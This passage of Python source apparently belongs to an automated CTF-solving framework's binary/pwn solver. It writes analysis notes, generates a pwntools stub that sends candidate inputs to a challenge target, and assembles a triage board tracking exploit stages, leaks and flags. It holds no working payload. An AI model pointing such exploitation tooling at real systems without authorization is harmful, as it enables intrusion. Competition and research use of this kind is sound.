        if pwn_env_doctor:
            lines.extend(["", "## Pwn Env Doctor"])
            for name, item in sorted(dict(pwn_env_doctor.get("tools") or {}).items()):
                lines.append("- tool.{0}: {1}".format(name, "yes" if item.get("available") else "no"))
            for name, item in sorted(dict(pwn_env_doctor.get("python_modules") or {}).items()):
                lines.append("- module.{0}: {1}".format(name, "yes" if item.get("available") else "no"))
        pwn_wave2_reports = list(binary_context.get("pwn_wave2_reports") or [])
        if pwn_wave2_reports:
            lines.extend(["", "## Pwn Wave-2"])
            for item in pwn_wave2_reports[:8]:
                lines.append(
                    "- {0}: status={1}".format(
                        item.get("template_kind", "") or "?",
                        item.get("status", "") or "?",
                    )
                )
                payload = dict(item.get("payload") or {})
                if payload.get("message"):
                    lines.append("  message: {0}".format(payload.get("message", "")))
        pwn_hard_reports = list(binary_context.get("pwn_hard_reports") or [])
        if pwn_hard_reports:
            lines.extend(["", "## Pwn Wave-4"])
            for item in pwn_hard_reports[:8]:
                lines.append(
                    "- {0}: status={1}, family={2}".format(
                        item.get("lane", "") or item.get("template_kind", "") or "?",
                        item.get("status", "") or "?",
                        item.get("family", "") or "?",
                    )
                )
                payload = dict(item.get("payload") or {})
                if payload.get("summary"):
                    lines.append("  summary: {0}".format(payload.get("summary", "")))
                if payload.get("blockers"):
                    lines.append("  blockers: {0}".format(", ".join(list(payload.get("blockers") or [])[:4])))
        angr_probe = dict(binary_context.get("angr_probe") or {})
        if angr_probe:
            lines.extend(["", "## Remote Angr Probe"])
            lines.append("- status: {0}".format(angr_probe.get("status", "")))
            if angr_probe.get("reason"):
                lines.append("- reason: {0}".format(angr_probe.get("reason", "")))
            for item in list(angr_probe.get("candidate_inputs", []))[:4]:
                lines.append("- candidate_input: {0}".format(item))
            for item in list(angr_probe.get("candidate_outputs", []))[:2]:
                lines.append("- candidate_output: {0}".format(str(item).strip().replace("\n", " | ")))
        selected_debugger = dict(binary_context.get("selected_debugger") or {})
        if selected_debugger:
            lines.extend(["", "## Debugger Selection"])
            lines.append("- debugger: {0}".format(selected_debugger.get("debugger_name", "") or "none"))
            lines.append("- bits: {0}".format(selected_debugger.get("bits", "") or "unknown"))
            lines.append("- reason: {0}".format(selected_debugger.get("reason", "") or ""))
        selected_analyzer = dict(binary_context.get("selected_analyzer") or {})
        if selected_analyzer:
            lines.extend(["", "## Analyzer Selection"])
            lines.append("- analyzer: {0}".format(selected_analyzer.get("analyzer_name", "") or "none"))
            lines.append("- mode: {0}".format(selected_analyzer.get("analyzer_mode", "") or "unknown"))
            lines.append("- lane: {0}".format(selected_analyzer.get("lane", "") or "unknown"))
            lines.append("- reason: {0}".format(selected_analyzer.get("reason", "") or ""))
        analysis_strategy = dict(binary_context.get("analysis_strategy") or {})
        if analysis_strategy:
            lines.extend(["", "## Analysis Strategy"])
            lines.append("- order: {0}".format(", ".join(list(analysis_strategy.get("order", []))) or "none"))
            lines.append("- skipped: {0}".format(", ".join(list(analysis_strategy.get("skipped", []))) or "none"))
            lines.append("- fallback_used: {0}".format("yes" if analysis_strategy.get("fallback_used") else "no"))
            lines.append("- signal_score: {0}".format(analysis_strategy.get("signal_score", 0)))
            if analysis_strategy.get("reason"):
                lines.append("- reason: {0}".format(analysis_strategy.get("reason", "")))
        lines.extend(["", "## Tool Usage"])
        for item in list(binary_context.get("used_tools", []))[:12]:
            lines.append("- tool: {0}".format(item))
        if not binary_context.get("used_tools"):
            lines.append("- none")
        for item in list(binary_context.get("used_mcp", []))[:12]:
            lines.append("- mcp: {0}".format(item))
        if not binary_context.get("used_mcp"):
            lines.append("- mcp: none")
        lines.extend(["", "## Debug Helpers"])
        for item in list(binary_context.get("debug_helpers", []))[:6]:
            lines.append("- {0}".format(item.get("name", "")))
            lines.append("  launcher: {0}".format(item.get("launcher_path", "")))
            lines.append("  notes: {0}".format(item.get("notes_path", "")))
            if item.get("command_preview"):
                lines.append("  command: {0}".format(item.get("command_preview", "")))
        if not binary_context.get("debug_helpers"):
            lines.append("- none")
        lines.extend(["", "## Findings"])
        for item in state.findings[:20]:
            lines.append("- [{0}] {1}".format(item.source, item.summary))
            lines.append("  evidence: {0}".format(item.evidence))
        if not state.findings:
            lines.append("- none")
        lines.extend(["", "## Exploit Plans"])
        for item in state.exploit_plans[:10]:
            lines.append("- {0} ({1})".format(item.title, item.method))
            if item.notes:
                lines.append("  notes: {0}".format(item.notes.replace("\n", " | ")))
        if not state.exploit_plans:
            lines.append("- none")
        lines.extend(["", "## Candidate Flags"])
        for item in state.candidate_flags[:10]:
            lines.append("- {0} [{1}] confidence={2} reproducible={3}".format(item.value, item.source, item.confidence, item.reproducible))
        if not state.candidate_flags:
            lines.append("- none")
        lines.extend(["", "## Attachments"])
        for item in attachment_summaries:
            lines.append("- {0}: {1}".format(item.get("name", ""), item.get("kind", "")))
        if best_flag:
            lines.extend(["", "## Final Result", "Flag: {0}".format(best_flag.value)])
        self.file_tool.write_text(workspace / "notes.md", "\n".join(lines).strip() + "\n")

    def _write_solution_stub(self, challenge, workspace, state, category, binary_context):
        best_flag = self.verifier.choose_best(state, challenge)
        target_host, target_port = self._parse_host_port(challenge.target or "")
        built_candidate = dict(dict(binary_context.get("source_build") or {}).get("candidate") or {})
        default_binary_path = built_candidate.get("path") or (str(challenge.attachments[0]) if challenge.attachments else "")
        if category == "pwn":
            payload = """#!/usr/bin/env python3
from pwn import *

TARGET_HOST = {host!r}
TARGET_PORT = {port}
BINARY_PATH = {path!r}
CANDIDATE_INPUTS = {inputs}


def start():
    if TARGET_HOST and TARGET_PORT:
        return remote(TARGET_HOST, TARGET_PORT)
    return process(BINARY_PATH)


def main():
    io = start()
    for item in CANDIDATE_INPUTS:
        io.sendline(item.encode())
        data = io.recvrepeat(1)
        print(data.decode(errors="replace"))
    io.close()


if __name__ == "__main__":
    main()
""".format(
                host=target_host,
                port=target_port,
                path=default_binary_path,
                inputs=[item.get("value", "") for item in list(binary_context.get("candidate_inputs", []))[:6]],
            )
        else:
            payload = """#!/usr/bin/env python3
import sys

BINARY_PATH = {path!r}
CANDIDATE_INPUTS = {inputs}
BEST_FLAG = {flag!r}


def main():
    print("candidate inputs:")
    for item in CANDIDATE_INPUTS:
        print("-", item)
    if BEST_FLAG:
        print("best flag:", BEST_FLAG)


if __name__ == "__main__":
    main()
""".format(
                path=default_binary_path,
                inputs=[item.get("value", "") for item in list(binary_context.get("candidate_inputs", []))[:8]],
                flag=best_flag.value if best_flag else "",
            )
        self.file_tool.write_text(workspace / "solution.py", payload)

    def _write_board(self, challenge, workspace, state, attachment_summaries, binary_context, remote_reports, remote_selection):
        configured_tools = self.toolkit_tool.available_tools() if self.toolkit_tool and self.toolkit_tool.is_configured() else []
        available_servers = [item.get("name", "") for item in self.mcp_registry.list_servers()] if self.mcp_registry and self.mcp_registry.has_servers() else []
        available_hosts = self.remote_tool.list_hosts() if self.remote_tool else []
        autopilot = dict((challenge.metadata or {}).get("autopilot_plan") or {})
        category = self._normalize_category(challenge.category)
        capability_plan = self.toolkit_tool.capability_plan(category, binary_context.get("subtype", "")) if self.toolkit_tool and self.toolkit_tool.is_configured() else {}
        best_flag = self.verifier.choose_best(state, challenge)
        pwn_capabilities = dict(binary_context.get("pwn_capabilities") or {})
        pwn_parity = dict(binary_context.get("pwn_parity") or {})
        next_actions = self._next_actions(state, category, binary_context.get("subtype", ""))
        pwn_family = str(binary_context.get("pwn_family") or "").strip()
        if category == "pwn" and pwn_family:
            stage_status = dict(binary_context.get("pwn_stage_status") or {})
            family_action = "hard-pwn family={0}, stage={1}".format(
                pwn_family,
                stage_status.get("status", "classified-only") or "classified-only",
            )
            next_actions = [family_action] + [item for item in next_actions if item != family_action]
        bootstrap_hint = self._build_pwn_bootstrap_hint(remote_selection.get("selected_host", ""), pwn_parity)
        if category == "pwn" and bootstrap_hint:
            if pwn_parity.get("profile") == "weak":
                next_actions = [bootstrap_hint] + next_actions
            else:
                next_actions = next_actions + [bootstrap_hint]
        blockers = ([state.blocked_reason] if state.blocked_reason else []) + self._build_pwn_board_blockers(
            category,
            pwn_parity,
            selected_host=remote_selection.get("selected_host", ""),
        )
        blockers.extend(list(binary_context.get("hard_blockers", []))[:4])
        blockers.extend(list(dict(binary_context.get("pwn_stage_status") or {}).get("blockers", []))[:4])
        blockers = list(dict.fromkeys([str(item).strip() for item in blockers if str(item).strip()]))[:8]
        board_context = {
            "attachments": attachment_summaries,
            "configured_tools": configured_tools,
            "toolkit_capabilities": self.toolkit_tool.capability_digest() if self.toolkit_tool and self.toolkit_tool.is_configured() else {},
            "used_tools": list(binary_context.get("used_tools", [])),
            "recommended_tools": self._recommended_tools(category, binary_context.get("subtype", "")),
            "available_mcp_servers": available_servers,
            "mcp_digest": self.mcp_registry.tool_digest() if self.mcp_registry and self.mcp_registry.has_servers() else [],
            "recommended_mcp": self._recommended_mcp(),
            "used_mcp": list(binary_context.get("used_mcp", [])),
            "available_remote_hosts": available_hosts,
            "selected_remote_host": remote_selection.get("selected_host", ""),
            "remote_selection_mode": remote_selection.get("selection_mode", ""),
            "remote_selection_reason": remote_selection.get("reason", ""),
            "remote_selection_candidates": list(remote_selection.get("candidates", [])),
            "remote_reports": list(remote_reports or []),
            "remote_placeholder": "Remote helper layer is connected and can validate binary plans.",
            "recommended_path": binary_context.get("best_path") or "{0}:{1}".format(category, binary_context.get("subtype", "binary")),
            "next_actions": next_actions,
            "blockers": blockers,
            "normalized_target": challenge.target or "",
            "autopilot": autopilot,
            "capability_plan": dict(binary_context.get("capability_plan") or capability_plan),
            "pwn_capabilities": pwn_capabilities,
            "pwn_parity": pwn_parity,
            "binary": {
                "subtype": binary_context.get("subtype", ""),
                "summary": binary_context.get("summary", ""),
                "protections": dict(binary_context.get("protections", {})),
                "candidate_inputs": list(binary_context.get("candidate_inputs", [])),
                "candidate_input_count": binary_context.get("candidate_input_count", 0),
                "exploit_plan_count": binary_context.get("exploit_plan_count", 0),
                "interesting_symbols": list(binary_context.get("interesting_symbols", [])),
                "best_path": binary_context.get("best_path", ""),
                "mcp_used": bool(binary_context.get("mcp_used", False)),
                "remote_used": bool(binary_context.get("remote_used", False)),
                "analysis_strategy": dict(binary_context.get("analysis_strategy", {})),
                "recommended_remote_templates": list(binary_context.get("recommended_remote_templates", [])),
                "selected_debugger": dict(binary_context.get("selected_debugger", {})),
                "selected_analyzer": dict(binary_context.get("selected_analyzer", {})),
                "pwn_capabilities": pwn_capabilities,
                "pwn_parity": pwn_parity,
                "pwn_env_doctor": dict(binary_context.get("pwn_env_doctor", {})),
                "pwn_wave2_reports": list(binary_context.get("pwn_wave2_reports", [])),
                "build_profile": str(binary_context.get("build_profile", "") or ""),
                "build_capabilities": dict(binary_context.get("build_capabilities", {})),
                "build_missing": list(binary_context.get("build_missing", [])),
                "build_recommended": list(binary_context.get("build_recommended", [])),
                "suggested_build_template": str(binary_context.get("suggested_build_template", "") or ""),
                "source_build": dict(binary_context.get("source_build", {})),
                "build_reports": list(binary_context.get("build_reports", [])),
                "debug_trace": dict(binary_context.get("debug_trace", {})),
                "pwn_family": pwn_family,
                "pwn_family_confidence": float(binary_context.get("pwn_family_confidence", 0.0) or 0.0),
                "pwn_family_evidence": list(binary_context.get("pwn_family_evidence", [])),
                "pwn_family_candidates": list(binary_context.get("pwn_family_candidates", [])),
                "pwn_stage_status": dict(binary_context.get("pwn_stage_status", {})),
                "exploit_stub_generated": bool(binary_context.get("exploit_stub_generated", False)),
                "stage2_generated": bool(binary_context.get("stage2_generated", False)),
                "pwn_hard_reports": list(binary_context.get("pwn_hard_reports", [])),
                "hard_blockers": list(binary_context.get("hard_blockers", [])),
                "leak_artifacts": list(binary_context.get("leak_artifacts", [])),
                "resolved_libc_context": dict(binary_context.get("resolved_libc_context", {})),
                "stage1_payload": dict(binary_context.get("stage1_payload", {})),
                "stage2_payload": dict(binary_context.get("stage2_payload", {})),
                "exploit_transcript": dict(binary_context.get("exploit_transcript", {})),
            },
        }
        board = build_triage_board(
            challenge,
            state,
            workspace,
            solver_name="binary",
            context=board_context,
            run_meta={"run_id": challenge.metadata.get("run_id", ""), "status": "solved" if best_flag else "unresolved"},
        )
        self.file_tool.write_json(workspace / "triage_board.json", board)

    def _normalize_category(self, category):
        value = str(category or "re").strip().lower()
        if value in {"re", "reverse"}:
            return "reverse"
        return value or "reverse"

    def _record_binary_tool(self, binary_context, name):
        items = list(binary_context.get("used_tools", []))
        value = str(name or "").strip()
        if value and value not in items:
            items.append(value)
        binary_context["used_tools"] = items

    def _record_binary_mcp(self, binary_context, name):
        items = list(binary_context.get("used_mcp", []))
        value = str(name or "").strip()
        if value and value not in items:
            items.append(value)
        binary_context["used_mcp"] = items

    def _parse_host_port(self, target):
        match = re.search(r"([A-Za-z0-9_.-]+):(\d{1,5})", str(target or ""))
        if not match:
            return "", 0
        return match.group(1), int(match.group(2))

    def _best_plan(self, state):
        if not state.exploit_plans:
            return None
        return sorted(state.exploit_plans, key=lambda item: item.confidence, reverse=True)[0]
